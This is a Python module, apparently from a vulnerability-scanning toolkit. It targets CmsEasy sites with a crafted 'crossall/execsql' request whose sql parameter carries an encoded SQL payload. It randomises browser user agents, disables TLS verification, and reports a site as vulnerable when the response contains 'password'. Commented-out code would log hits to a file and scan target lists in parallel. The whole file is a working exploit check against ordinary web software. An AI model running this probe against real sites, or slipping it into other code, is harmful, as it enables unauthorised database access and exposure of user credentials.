import requests
import urllib3
from urllib import parse
from time import time
import random
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CmsEasySqlScan:
	def get_ua(self):
		first_num = random.randint(55, 62)
		third_num = random.randint(0, 3200)
		fourth_num = random.randint(0, 140)
		os_type = [
			'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
			'(Macintosh; Intel Mac OS X 10_12_6)'
		]
		chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

		ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
					   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
					  )
		return ua

	# def wirte_targets(self,vurl, filename):
	# 	with open(filename, "a+") as f:
	# 		f.write(vurl + "\n")

	def check_url(self,url):
		url=parse.urlparse(url)
		url='{}://{}'.format(url[0],url[1])
		url=url + "/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"
		# print(url)
		headers = {
			'User-Agent': self.get_ua(),
		}
		try:
			res = requests.get(url, verify=self.ssl, allow_redirects=False, headers=headers, timeout=self.timeout,proxies=self.proxy)
			if res.status_code == 200 and 'password' in res.text:
				# rr=re.compile(r"Content-Length': '(.*?)'", re.I)
				OutPrintInfo("CmsEasy",f"[b bright_red]存在漏洞 {url}")
				# self.wirte_targets(url,"vuln.txt")
			else:

				OutPrintInfo("CmsEasy","目标不存在漏洞")
				# rr=re.compile(r'Length(.*?)Date')
		except Exception as e:
			pass


	# def multithreading(self,url_list, pools=5):
	# 	works = []
	# 	for i in url_list:
	# 		# works.append((func_params, None))
	# 		works.append(i)
	# 	# print(works)
	# 	pool = threadpool.ThreadPool(pools)
	# 	reqs = threadpool.makeRequests(self.check_url, works)
	# 	[pool.putRequest(req) for req in reqs]
	# 	pool.wait()


	def main(self,target):
		url=target[0].strip("/ ")
		self.ssl = target[1]
		self.timeout = int(target[2])
		proxy = target[3]
		req = ReqSet(proxy=proxy)
		self.proxy = req["proxy"]
		OutPrintInfo("CmsEasy","任务开始.....")
		start=time()
		# if url != None and filename == None:
		self.check_url(url)
		# elif url == None and filename != None:
		# 	for i in open(filename):
		# 		i=i.replace('\n','')
		# 		url_list.append(i)
		# 	self.multithreading(url_list,10)
		end=time()
		OutPrintInfo("CmsEasy",f'任务完成,用时{str(end-start)}s' )